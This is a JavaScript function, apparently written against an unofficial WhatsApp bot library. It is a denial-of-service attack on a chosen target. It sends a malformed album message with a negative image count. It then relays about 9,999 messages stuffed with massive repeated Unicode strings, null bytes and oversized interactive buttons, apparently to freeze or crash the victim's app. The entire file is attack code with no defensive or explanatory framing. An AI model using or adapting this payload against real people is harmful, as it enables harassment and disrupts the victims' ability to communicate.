async function albumdelayinvisible(target) {
  const fakeKey = {
    remoteJid: “status@broadcast ”,
    fromMe: true,
    id: await sock.relayMessage(
      target, {
        albumMessage: {
          expectedImageCount: -99999999,
          expectedVideoCount: 0,
          caption: "x",
        },
      },
      { participant: { jid: target } }
    ),
  };
  let xx = {
    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQP-LtlwUD2se4WwbHuAcLfNkQExEEAg1XB7USSkMr3T6Ak44ejssvZUa1Ws50LVEF3DA4sSggQyPxsDB-Oj1kWUktND6jFhKMKh7hOLeA?ccb=9-4&oh=01_Q5Aa2AEF_MR-3UkNgxeEKr2zpsTp0ClCZDggq1i0bQZbCGlFUA&oe=68B7C20F&_nc_sid=e6ed6c&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: "yTsEb/zyGK+lB2DApj/PK+gFA1D6Heq/G0DIQ74uh6k=",
    fileLength: "52039",
    height: 786,
    width: 891,
    mediaKey: "XtKW4xJTHhBzWsRkuwvqwQp/7SVayGn6sF6XgNblyLo=",
    fileEncSha256: "rm/kKkIFGA1Vh6yKeaetbsvCS7Cp2vcGYoiNkrvPCwY=",
    directPath:
      "/o1/v/t24/f2/m238/AQP-LtlwUD2se4WwbHuAcLfNkQExEEAg1XB7USSkMr3T6Ak44ejssvZUa1Ws50LVEF3DA4sSggQyPxsDB-Oj1kWUktND6jFhKMKh7hOLeA?ccb=9-4&oh=01_Q5Aa2AEF_MR-3UkNgxeEKr2zpsTp0ClCZDggq1i0bQZbCGlFUA&oe=68B7C20F&_nc_sid=e6ed6c",
  };
  let xz;
  for (let s = 0; s < 9999; s++) {
    if (s === 9999) {
      xx.caption = "𑲱".repeat(200000);
    }
    const xy = generateWAMessageFromContent(
      target,
      proto.Message.fromObject({
        botInvokeMessage: {
          message: {
            messageContextInfo: {
              messageSecret: crypto.randomBytes(32),
              messageAssociation: {
                associationType: "MEDIA_ALBUM",
                parentMessageKey: fakeKey,
              },
            },
            imageMessage: xx,
            interactiveMessage: {
              header: {
                hasMediaAttachment: false,
                title: "hello",
              },
              body: { text: "ꦾ࣯࣯".repeat(1000) },
              nativeFlowMessage: {
                buttons: [{
                    name: "single_select",
                    buttonParamsJson: JSON.stringify({
                      title: "ꦾ࣯࣯".repeat(2500),
                      sections: [{
                          title: "\u0000",
                          rows: [{
                              id: "opt_1",
                              title: "ꦾ࣯࣯".repeat(2500),
                              description: "\u0000",
                            },{
                              id: "opt_2",
                              title: "@3".repeat(5000),
                              description: "\u0000",
                            },
                          ],
                        },
                      ],
                    }),
                  },
                ],
                messageParamsJson: "{}",
              },
            },
          },
        },
      }),
      { participant: { jid: target } }
    );
    xz = await sock.relayMessage(target, xy.message, {
      messageId: xy.key.id,
      participant: { jid: target },
    });
    await sleep(100);
  }
}
